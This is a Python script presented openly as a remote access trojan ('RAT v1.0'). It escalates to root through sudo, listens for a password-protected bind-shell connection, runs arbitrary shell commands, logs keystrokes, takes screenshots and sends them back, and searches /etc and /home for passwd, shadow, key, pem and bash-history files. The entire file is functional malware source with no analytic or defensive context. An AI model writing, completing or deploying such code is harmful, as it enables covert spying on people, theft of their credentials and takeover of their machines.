#!/usr/bin/env python3
import socket, ssl, subprocess, threading, os, sys, time
from pynput import keyboard
import pyautogui

# Configuration
HOST, PORT = "0.0.0.0", 5555
SECRET = "your_shared_secret"  # change before use
LOGDIR = "logs"
SEARCH_DIRS = ["/etc", "/home"]
KEYWORDS = ["passwd","shadow",".conf",".key",".pem",".bash_history"]
KEYLOG_FILE = None
keylogger = None

# Ensure log dir exists
os.makedirs(LOGDIR, exist_ok=True)

# Privilege escalation
def escalate_privileges():
    if os.geteuid() != 0:
        os.execvp("sudo", ["sudo", sys.executable] + sys.argv)

# Core functions
def execute(cmd):
    return subprocess.getoutput(cmd)

def search_files():
    matches = []
    for d in SEARCH_DIRS:
        for root, _, files in os.walk(d):
            for f in files:
                if any(k in f.lower() for k in KEYWORDS):
                    matches.append(os.path.join(root, f))
    return "\n".join(matches) or "[*] No matches."

def memory_info():
    mem = open("/proc/meminfo").readlines()[:10]
    procs = execute("ps aux --sort=-%mem | head -n6")
    return "--- Mem ---\n" + "".join(mem) + "\n--- Top Procs ---\n" + procs

# Keylogger callbacks
def on_press(key):
    global KEYLOG_FILE
    try:
        KEYLOG_FILE.write(f"{key.char}")
    except AttributeError:
        KEYLOG_FILE.write(f"[{key.name}]")

# Command handler
def handle_cmd(cmd, conn):
    cmd = cmd.strip().lower()
    # Built-ins
    if cmd == "search": return search_files().encode()
    if cmd == "mem":    return memory_info().encode()
    if cmd == "start_keylogger":
        global keylogger, KEYLOG_FILE
        fname = f"{LOGDIR}/keylog_{int(time.time())}.txt"
        KEYLOG_FILE = open(fname, "w+")
        keylogger = keyboard.Listener(on_press=on_press)
        keylogger.start()
        return f"[*] Keylogger started: {fname}".encode()
    if cmd == "stop_keylogger":
        keylogger.stop()
        KEYLOG_FILE.close()
        return b"[*] Keylogger stopped."
    if cmd == "get_keylog":
        fname = KEYLOG_FILE.name if KEYLOG_FILE else None
        if not fname or not os.path.exists(fname):
            return b"[!] No keylog available."
        data = open(fname, "rb").read()
        header = f"FILE:{os.path.basename(fname)}:{len(data)}\n".encode()
        return header + data
    if cmd == "screenshot":
        fname = f"{LOGDIR}/screen_{int(time.time())}.png"
        img = pyautogui.screenshot()
        img.save(fname)
        data = open(fname, "rb").read()
        header = f"FILE:{os.path.basename(fname)}:{len(data)}\n".encode()
        return header + data
    # Default: shell
    return execute(cmd).encode()

# Client thread
def client_thread(conn, addr):
    # SSL wrapping placeholder (if using certs)
    # conn = ssl.wrap_socket(conn, server_side=True, keyfile="certs/server.key", certfile="certs/server.crt")

    # Authentication
    conn.sendall(b"Password: ")
    pwd = conn.recv(1024).decode().strip()
    if pwd != SECRET:
        conn.sendall(b"[!] Auth failed.\n")
        conn.close(); return

    # Banner
    conn.sendall(b"[*] RAT v1.0 connected.\nCommands: search, mem, start_keylogger, stop_keylogger, get_keylog, screenshot, exit, [shell]\n")

    while True:
        conn.sendall(b"RAT> ")
        raw = conn.recv(4096)
        if not raw: break
        cmd = raw.decode().strip()
        if cmd == "exit": break
        resp = handle_cmd(cmd, conn)
        conn.sendall(resp)
    conn.close()

# Main
if __name__=="__main__":
    escalate_privileges()
    s = socket.socket()
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"[+] Agent listening on {HOST}:{PORT}")
    while True:
        c, a = s.accept()
        print(f"[+] Connection from {a}")
        threading.Thread(target=client_thread, args=(c, a)).start()